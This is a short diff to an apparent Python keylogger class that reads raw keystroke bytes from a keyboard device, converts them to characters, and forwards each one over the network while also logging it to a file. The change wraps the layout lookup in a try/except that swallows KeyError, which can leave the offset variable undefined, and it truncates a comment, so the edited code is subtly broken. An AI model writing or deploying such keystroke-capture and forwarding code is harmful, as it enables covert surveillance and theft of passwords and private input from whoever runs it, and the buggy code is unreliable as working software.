@@ -85,9 +85,13 @@ class KeyLogger:
                 logging.error("Keyboard no longer connected")
                 exit()
             if data:
-                key_code = data[2]  # The key code is in byte 2
+                key_code = data[2]  # The key code is in byte
                 try:
-                    char: chr = chr(self.keyboard_layout[str(key_code)] + key_code)
+                    try:
+                        offset: int =self.keyboard_layout[str(key_code)]
+                    except KeyError:
+                        pass
+                    char: chr = chr(offset + key_code)
                     try:
                         self.__forwarder.send_over_network(data=char)
                         # write data in file
